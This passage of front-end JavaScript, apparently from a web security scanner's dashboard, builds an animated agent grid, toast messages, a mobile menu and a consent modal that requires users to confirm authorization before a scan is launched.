  const agentsGrid = document.getElementById('tut-agents-grid');
  if (agentsGrid) {
    agentsGrid.innerHTML = AGENTS.map(a =>
      `<div class="tutorial-agent-card" id="tut-agent-${a.id}"><div class="tutorial-agent-icon"><i class="fas ${a.icon}"></i></div><div><div class="tutorial-agent-name">${a.name}</div><div class="tutorial-agent-status">${a.phase}</div></div></div>`
    ).join('');
    // Animate agents one by one
    let i = 0;
    const interval = setInterval(() => {
      if (i >= AGENTS.length) { clearInterval(interval); return; }
      const card = document.getElementById(`tut-agent-${AGENTS[i].id}`);
      if (card) {
        card.classList.add('running');
        setTimeout(() => { card.classList.remove('running'); card.classList.add('done'); }, 800);
      }
      i++;
    }, 500);
  }

  // Init
  activateStep(1);
}

/* ========================================
   TOAST
   ======================================== */
function showToast(message) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();
  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
  toast.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:9999;background:#172560;border:1px solid rgba(255,239,77,0.2);color:#e8ecf5;padding:14px 20px;border-radius:10px;font-size:13px;font-family:Inter,sans-serif;display:flex;align-items:center;gap:10px;box-shadow:0 8px 32px rgba(0,0,0,0.4);animation:toastIn 0.3s ease';
  document.body.appendChild(toast);
  if (!document.getElementById('toast-style')) {
    const s = document.createElement('style'); s.id = 'toast-style';
    s.textContent = '@keyframes toastIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}';
    document.head.appendChild(s);
  }
  setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.3s'; setTimeout(() => toast.remove(), 300); }, 4000);
}

/* ========================================
   AUTHORIZATION MODAL
   ======================================== */
function showAuthorizationModal(targetUrl, onConfirm) {
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.innerHTML = `
    <div class="modal">
      <div class="modal-icon"><i class="fas fa-shield-halved"></i></div>
      <h2>Authorization Required</h2>
      <p class="modal-subtitle">You must confirm authorization before scanning <strong>${targetUrl}</strong></p>
      <div class="legal-box">
        <h4>Terms of Authorized Security Testing</h4>
        <ul>
          <li>I am the <strong>owner</strong> of the target application or have <strong>written authorization</strong> from the owner to perform security testing.</li>
          <li>I understand that this tool will actively probe for vulnerabilities, including sending specially crafted requests to detect SQL injection, XSS, auth bypass, SSRF, and other security weaknesses.</li>
          <li>I confirm the target is a <strong>staging/test environment</strong> or I accept full responsibility for testing production systems.</li>
          <li>I understand this tool does <strong>not modify data destructively</strong> but may create test entries during the scanning process.</li>
        </ul>
        <p class="warning-text">Unauthorized computer access is a criminal offense under Art. 154-A of the Brazilian Penal Code, the US Computer Fraud and Abuse Act (CFAA), and similar laws worldwide.</p>
      </div>
      <div class="consent-row" id="consent-1"><input type="checkbox" id="chk-owner"><label for="chk-owner">I own this application or have explicit written authorization to test it</label></div>
      <div class="consent-row" id="consent-2"><input type="checkbox" id="chk-staging"><label for="chk-staging">I am testing against a staging/test environment (or accept full responsibility)</label></div>
      <div class="consent-row" id="consent-3"><input type="checkbox" id="chk-legal"><label for="chk-legal">I understand the legal implications and take full responsibility</label></div>
      <div class="modal-actions">
        <button class="btn-ghost" id="modal-cancel"><i class="fas fa-times"></i> Cancel</button>
        <button class="btn-primary" id="modal-confirm" disabled><i class="fas fa-check"></i> Confirm & Launch</button>
      </div>
    </div>`;

  document.body.appendChild(overlay);
  const chks = ['#chk-owner','#chk-staging','#chk-legal'].map(s => overlay.querySelector(s));
  const confirmBtn = overlay.querySelector('#modal-confirm');
  const update = () => { confirmBtn.disabled = !chks.every(c => c.checked); };
  chks.forEach(c => c.addEventListener('change', update));
  overlay.querySelectorAll('.consent-row').forEach(row => {
    row.addEventListener('click', (e) => { if (e.target.tagName !== 'INPUT') { const c = row.querySelector('input'); c.checked = !c.checked; update(); } });
  });
  const close = () => overlay.remove();
  overlay.querySelector('#modal-cancel').addEventListener('click', close);
  overlay.addEventListener('click', (e) => { if (e.target === overlay) close(); });
  confirmBtn.addEventListener('click', () => { close(); onConfirm(); });
}

/* ========================================
   MOBILE MENU
   ======================================== */
function initMobileMenu() {
  const btn = document.getElementById('mobile-menu-btn');
  const sidebar = document.querySelector('.sidebar');
  const overlay = document.getElementById('sidebar-overlay');
  if (!btn || !sidebar || !overlay) return;
  btn.addEventListener('click', () => sidebar.classList.toggle('open'));
  overlay.addEventListener('click', () => sidebar.classList.remove('open'));
  document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => { if (window.innerWidth <= 640) sidebar.classList.remove('open'); });
  });
}

/* ── Init ── */
window.addEventListener('hashchange', () => navigate(getPageFromHash()));
document.addEventListener('DOMContentLoaded', () => {
  navigate(getPageFromHash());
  initMobileMenu();
});
